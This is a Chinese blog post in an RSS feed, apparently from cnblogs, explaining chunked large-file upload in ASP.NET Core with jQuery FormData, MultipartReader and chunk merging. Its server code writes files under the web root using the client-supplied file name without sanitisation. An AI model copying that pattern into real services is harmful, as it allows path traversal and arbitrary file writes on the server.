&lt;span&gt;function&lt;/span&gt;&lt;span&gt; UploadFileChunk(chunk) {
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; data = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; FormData();
    data.append(&lt;/span&gt;&quot;file&quot;&lt;span&gt;, chunk.file, chunk.filePartName);
    $.ajax({
        url: &lt;/span&gt;'/api/upload/upload?' +&lt;span&gt; chunk.urlParameter,
        type: &lt;/span&gt;&quot;post&quot;&lt;span&gt;,
        cache: &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;,
        contentType: &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;,
        processData: &lt;/span&gt;&lt;span&gt;false&lt;/span&gt;&lt;span&gt;,
        data: data,
    });
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;我们可以看到在URL上额外加了其他参数，为什么要加上这些参数呢？主要为解决几个问题，其一：前端确认缓冲区大小，我们获取前端确认的缓冲区大小，这样后台不用写死，更加灵活，万一后续进行了修改，谁知道呢？其二：我们怎么确定文件是否已经全部上传完了呢？在URL上我们添加分片总数和文件实际大小来完全确定文件已经全部上传和文件完整无缺。当然也额外添加了每一片读取的起始位置和结束位置，若有所需也可以利用。多余的就不用我再解释。接下来我们看看后台如何对每一片进行处理呢？在.NET Core中实际上提供了对应APi来专门读取FormData数据，利用Microsoft.AspNetCore.WebUtilities命名空间下的MultipartReader类。&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202008/589642-20200808190634060-60129272.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;首先我们判断是否请求内容是否为FormData，同时通过上下文获取上述文件读取类的参数boundary，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;bool&lt;/span&gt; IsMultipartContentType(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; contentType)
{
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;
        !&lt;span&gt;string&lt;/span&gt;.IsNullOrEmpty(contentType) &amp;amp;&amp;amp;&lt;span&gt;
        contentType.IndexOf(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;multipart/&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;, StringComparison.OrdinalIgnoreCase) &amp;gt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetBoundary(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; contentType)
{
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; elements = contentType.Split(&lt;span&gt;'&lt;/span&gt; &lt;span&gt;'&lt;/span&gt;&lt;span&gt;);
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; element = elements.Where(entry =&amp;gt; entry.StartsWith(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;boundary=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)).First();
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; boundary = element.Substring(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;boundary=&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.Length);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (boundary.Length &amp;gt;= &lt;span&gt;2&lt;/span&gt; &amp;amp;&amp;amp; boundary[&lt;span&gt;0&lt;/span&gt;] == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt; &amp;amp;&amp;amp;&lt;span&gt;
        boundary[boundary.Length &lt;/span&gt;- &lt;span&gt;1&lt;/span&gt;] == &lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
    {
        boundary &lt;/span&gt;= boundary.Substring(&lt;span&gt;1&lt;/span&gt;, boundary.Length - &lt;span&gt;2&lt;/span&gt;&lt;span&gt;);
    }
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; boundary;
}

&lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; GetFileName(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; contentDisposition)
{
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; contentDisposition
        .Split(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
        .SingleOrDefault(part &lt;/span&gt;=&amp;gt; part.Contains(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;filename&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;))
        .Split(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;=&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;)
        .Last()
        .Trim(&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;接下来我们定义分片类而获取URL上每一片的参数，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FileChunk
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;文件名&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; FileName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 当前分片
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; PartNumber { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 缓冲区大小
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; Size { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 分片总数
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; Chunks { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 文件读取起始位置
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; Start { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 文件读取结束位置
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; End { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 文件大小
        &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; Total { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;接下来在提交控制器方法上去读取每一片数据如下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;if&lt;/span&gt; (!&lt;span&gt;IsMultipartContentType(context.Request.ContentType))
{
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; BadRequest();
}

&lt;/span&gt;&lt;span&gt;var&lt;/span&gt; boundary =&lt;span&gt; GetBoundary(context.Request.ContentType);
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (&lt;span&gt;string&lt;/span&gt;&lt;span&gt;.IsNullOrEmpty(boundary))
{
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; BadRequest();
}

&lt;/span&gt;&lt;span&gt;var&lt;/span&gt; reader = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; MultipartReader(boundary, context.Request.Body);

&lt;/span&gt;&lt;span&gt;var&lt;/span&gt; section = &lt;span&gt;await&lt;/span&gt; reader.ReadNextSectionAsync();
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;然后就是循环每一片（section），若不为空说明还存有分片文件，然后读取URL上的缓冲区大小，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;42&quot;&gt;
&lt;pre&gt;
&lt;span&gt;while&lt;/span&gt; (section != &lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;chunk为控制器方法上类FileChunk参数&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; buffer = &lt;span&gt;new&lt;/span&gt; &lt;span&gt;byte&lt;/span&gt;&lt;span&gt;[chunk.Size];
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; fileName =&lt;span&gt; GetFileName(section.ContentDisposition);
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;这里获取文件名便于查找指定文件夹下所有文件&lt;/span&gt;
    chunk.FileName =&lt;span&gt; fileName;
    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; path =&lt;span&gt; Path.Combine(_environment.WebRootPath, DEFAULT_FOLDER, fileName);
    &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; stream = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; FileStream(path, FileMode.Append))
    {
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; bytesRead;
        &lt;/span&gt;&lt;span&gt;do&lt;/span&gt;&lt;span&gt;
        {
            bytesRead &lt;/span&gt;= &lt;span&gt;await&lt;/span&gt; section.Body.ReadAsync(buffer, &lt;span&gt;0&lt;/span&gt;&lt;span&gt;, buffer.Length);
            stream.Write(buffer, &lt;/span&gt;&lt;span&gt;0&lt;/span&gt;&lt;span&gt;, bytesRead);

        } &lt;/span&gt;&lt;span&gt;while&lt;/span&gt; (bytesRead &amp;gt; &lt;span&gt;0&lt;/span&gt;&lt;span&gt;);
    }

    section &lt;/span&gt;= &lt;span&gt;await&lt;/span&gt;&lt;span&gt; reader.ReadNextSectionAsync();
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;在利用内置APi读取FormData数据时，在.NET Core 3.x会抛出如下异常：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202008/589642-20200808192826779-1778978166.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;大致原因出在.NET Core内置提供了对于参数的绑定和此方法读取貌似有点冲突导致，我们实现如下特性移除对应绑定，然后将其添加到文件上传方法上即可&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
[AttributeUsage(AttributeTargets.Class |&lt;span&gt; AttributeTargets.Method)]
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;sealed&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DisableFormValueModelBindingAttribute : Attribute, IResourceFilter
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnResourceExecuting(ResourceExecutingContext context)
    {
        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; factories =&lt;span&gt; context.ValueProviderFactories;
        factories.RemoveType&lt;/span&gt;&amp;lt;FormValueProviderFactory&amp;gt;&lt;span&gt;();
        factories.RemoveType&lt;/span&gt;&amp;lt;FormFileValueProviderFactory&amp;gt;&lt;span&gt;();
        factories.RemoveType&lt;/span&gt;&amp;lt;JQueryFormValueProviderFactory&amp;gt;&lt;span&gt;();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; OnResourceExecuted(ResourceExecutedContext context)
    {
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;所有分片文件上传完成后则是合并文件，合并的依据则是判断URL上当前分片数和分片总数是否相等，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;//&lt;/span&gt;&lt;span&gt;计算上传文件大小实时反馈进度（TODO)

&lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;合并文件（可能涉及转码等）&lt;/span&gt;
&lt;span&gt;if&lt;/span&gt; (chunk.PartNumber ==&lt;span&gt; chunk.Chunks)
{
    &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; MergeChunkFile(chunk);
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;既然是合并文件那就需要通过分片文件名称上末尾的分片号进行排序和拿到每一个分片文件路径以便合并后删除所有分片文件，所以我们定义如下类&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; FileSort
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;const&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; PART_NUMBER = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;.partNumber-&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 文件名
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; FileName { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;///&lt;/span&gt;&lt;span&gt; 文件分片号
    &lt;/span&gt;&lt;span&gt;///&lt;/span&gt; &lt;span&gt;&amp;lt;/summary&amp;gt;&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; PartNumber { &lt;span&gt;get&lt;/span&gt;; &lt;span&gt;set&lt;/span&gt;&lt;span&gt;; }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;最终合并文件方法，如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;43&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt;&lt;span&gt; Task MergeChunkFile(FileChunk chunk)
{
    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;文件上传目录名&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; uploadDirectoryName =&lt;span&gt; Path.Combine(_environment.WebRootPath, DEFAULT_FOLDER, chunk.FileName);

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;分片文件命名约定&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; partToken =&lt;span&gt; FileSort.PART_NUMBER;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;上传文件实际名称&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; baseFileName = chunk.FileName.Substring(&lt;span&gt;0&lt;/span&gt;&lt;span&gt;, chunk.FileName.IndexOf(partToken));

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;根据命名约定查询指定目录下符合条件的所有分片文件&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; searchpattern = $&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;{Path.GetFileName(baseFileName)}{partToken}*&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;获取所有分片文件列表&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; filesList =&lt;span&gt; Directory.GetFiles(Path.GetDirectoryName(uploadDirectoryName), searchpattern);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (!filesList.Any()) { &lt;span&gt;return&lt;/span&gt;&lt;span&gt;; }

    &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; mergeFiles = &lt;span&gt;new&lt;/span&gt; List&amp;lt;FileSort&amp;gt;&lt;span&gt;();
&lt;/span&gt;&lt;span&gt;    foreach&lt;/span&gt; (&lt;span&gt;string&lt;/span&gt; file &lt;span&gt;in&lt;/span&gt;&lt;span&gt; filesList)
    {&lt;br/&gt;&lt;/span&gt;&lt;span&gt;        var&lt;/span&gt; sort = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; FileSort
        {
            FileName &lt;/span&gt;=&lt;span&gt; file
        };

        baseFileName &lt;/span&gt;= file.Substring(&lt;span&gt;0&lt;/span&gt;&lt;span&gt;, file.IndexOf(partToken));

        &lt;/span&gt;&lt;span&gt;var&lt;/span&gt; fileIndex = file.Substring(file.IndexOf(partToken) +&lt;span&gt; partToken.Length);

        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt;.TryParse(fileIndex, &lt;span&gt;out&lt;/span&gt; &lt;span&gt;var&lt;/span&gt;&lt;span&gt; number);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (number &amp;lt;= &lt;span&gt;0&lt;/span&gt;) { &lt;span&gt;continue&lt;/span&gt;&lt;span&gt;; }

        sort.PartNumber &lt;/span&gt;=&lt;span&gt; number;

        mergeFiles.Add(sort);
    }&lt;/span&gt;&lt;span&gt;    //&lt;/span&gt;&lt;span&gt; 按照分片排序&lt;/span&gt;
    &lt;span&gt;var&lt;/span&gt; mergeOrders = mergeFiles.OrderBy(s =&amp;gt;&lt;span&gt; s.PartNumber).ToList();

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 合并文件&lt;/span&gt;
    &lt;span&gt;using&lt;/span&gt; &lt;span&gt;var&lt;/span&gt; fileStream = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; FileStream(baseFileName, FileMode.Create);
    &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; fileSort &lt;span&gt;in&lt;/span&gt;&lt;span&gt; mergeOrders)
    {
        &lt;/span&gt;&lt;span&gt;using&lt;/span&gt; FileStream fileChunk =
              &lt;span&gt;new&lt;/span&gt;&lt;span&gt; FileStream(fileSort.FileName, FileMode.Open);
        &lt;/span&gt;&lt;span&gt;await&lt;/span&gt;&lt;span&gt; fileChunk.CopyToAsync(fileStream);
    }

    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;删除分片文件&lt;/span&gt;
&lt;span&gt;    DeleteFile(mergeFiles);

}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; DeleteFile(List&amp;lt;FileSort&amp;gt;&lt;span&gt; files)
{
    &lt;/span&gt;&lt;span&gt;foreach&lt;/span&gt; (&lt;span&gt;var&lt;/span&gt; file &lt;span&gt;in&lt;/span&gt;&lt;span&gt; files)
    {
        System.IO.File.Delete(file.FileName);
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt; &lt;img src=&quot;https://img2020.cnblogs.com/blog/589642/202008/589642-20200808200421071-78179794.gif&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;总结&lt;/h2&gt;
&lt;p&gt;下载地址：&lt;a title=&quot;https://github.com/wangpengxpy/.NETCoreSliceUpload&quot; href=&quot;https://github.com/wangpengxpy/.NETCoreSliceUpload&quot; target=&quot;_blank&quot;&gt;https://github.com/wangpengxpy/.NETCoreSliceUpload&lt;/a&gt;。以上基本上实现了大文件分片处理，一些细节并未过多考虑，比如网络问题，以及文件由于采取异步上传，若我们通过计算所有文件大小和URL参数文件大小进行比对这会有问题，因为此时可能文件流处于缓冲区内还未持久化到磁盘，借此实现希望对有需要的童鞋提供一点思考方向。&lt;/p&gt;
</description>
<pubDate>Sat, 08 Aug 2020 12:10:00 +0000</pubDate>
<dc:creator>Jeffcky</dc:creator>
<og:description>前言 前两天发表利用FormData进行文件上传，然后有人问要是大文件几个G上传怎么搞，常见的不就是分片再搞下断点续传，动动手差不多也能搞出来，只不过要深入的话，考虑的东西还是很多。由于断点续传之前写</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/CreateMyself/p/13458917.html</dc:identifier>
</item>
</channel>
</rss>